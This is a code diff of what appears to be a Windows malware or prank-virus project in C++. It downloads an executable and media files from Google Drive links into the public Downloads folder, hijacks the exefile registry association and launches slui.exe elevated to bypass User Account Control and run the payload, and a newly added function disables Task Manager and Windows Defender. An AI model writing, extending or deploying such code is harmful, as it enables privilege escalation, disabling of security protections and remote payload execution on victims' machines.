@@ -1,41 +1,9 @@
-#pragma comment(lib, "urlmon.lib")
 #include <Windows.h>
-#include <string>
-using namespace std;
-
-void CRK(HKEY key, wstring path, wstring name)
-{
-	HKEY hKey;
-	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
-	{
-		HKEY hKeyResult;
-		RegCreateKeyW(hKey, name.c_str(), &hKeyResult);
-		RegCloseKey(hKey);
-	}
-}
-void DRK(HKEY key, wstring path, wstring name)
-{
-	HKEY hKey;
-	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
-	{
-		RegDeleteKeyW(hKey, name.c_str());
-		RegCloseKey(hKey);
-	}
-}
-void SRV(HKEY key, wstring path, wstring name, wstring value)
-{
-	HKEY hKey;
-	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
-	{
-		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
-		RegCloseKey(hKey);
-	}
-}
+#include "VirsHad.hpp"
 
 int Admin() {
-	const wchar_t* dwnld_URL = L"https://drive.google.com/uc?export=download&id=1eCpxk6SkIG6MCmOLgPt_nkgjaw698b7Z";
-	const wchar_t* savepath = L"C:\\Users\\Public\\Downloads\\Flopa.exe";
-	URLDownloadToFile(NULL, dwnld_URL, savepath, 0, NULL);
+	GetFileURL(L"https://drive.google.com/uc?export=download&id=1eCpxk6SkIG6MCmOLgPt_nkgjaw698b7Z",
+		L"C:\\Users\\Public\\Downloads\\Flopa.exe");
 
 	CRK(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
 	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile", L"shell");
@@ -45,7 +13,7 @@ int Admin() {
 	SRV(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open\\command", L"", L"C:\\Users\\Public\\Downloads\\Flopa.exe");
 	ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL, NULL, SW_SHOWNORMAL);
 
-	Sleep(1000);
+	Sleep(1500);
 
 	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
 	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
@@ -53,20 +21,19 @@ int Admin() {
 }
 
 int Download() {
-	const wchar_t* dwnld_URL1 = L"https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J";
-	const wchar_t* savepath1 = L"C:\\Users\\Public\\Downloads\\BG.wav";
-	URLDownloadToFile(NULL, dwnld_URL1, savepath1, 0, NULL);
+	GetFileURL(L"https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J",
+		L"C:\\Users\\Public\\Downloads\\BG.wav");
+	GetFileURL(L"https://drive.google.com/uc?export=download&id=1QSB8qiO7UNal3DRVcNksGqt7blJvfO7d",
+		L"C:\\Users\\Public\\Downloads\\WP.bmp");
+	GetFileURL(L"https://drive.google.com/uc?export=download&id=10uFLkcXovBrfUsKFv5aibp--y82cPGMi",
+		L"C:\\Users\\Public\\Downloads\\scream.wav");
+	GetFileURL(L"https://drive.google.com/uc?export=download&id=1NHPXcHardB10CLDIykeX3T758WyJc5zi",
+		L"C:\\Users\\Public\\Downloads\\screamBG.bmp");
+	return 0;
+}
 
-	const wchar_t* dwnld_URL2 = L"https://drive.google.com/uc?export=download&id=1QSB8qiO7UNal3DRVcNksGqt7blJvfO7d";
-	const wchar_t* savepath2 = L"C:\\Users\\Public\\Downloads\\WP.bmp";
-	URLDownloadToFile(NULL, dwnld_URL2, savepath2, 0, NULL);
-
-	const wchar_t* dwnld_URL3 = L"https://drive.google.com/uc?export=download&id=10uFLkcXovBrfUsKFv5aibp--y82cPGMi";
-	const wchar_t* savepath3 = L"C:\\Users\\Public\\Downloads\\scream.wav";
-	URLDownloadToFile(NULL, dwnld_URL3, savepath3, 0, NULL);
-
-	const wchar_t* dwnld_URL4 = L"https://drive.google.com/uc?export=download&id=1NHPXcHardB10CLDIykeX3T758WyJc5zi";
-	const wchar_t* savepath4 = L"C:\\Users\\Public\\Downloads\\screamBG.bmp";
-	URLDownloadToFile(NULL, dwnld_URL4, savepath4, 0, NULL);
+int Disable() {
+	SRV(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", L"1");
+	SRV(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiSpyware", L"1");
 	return 0;
 }
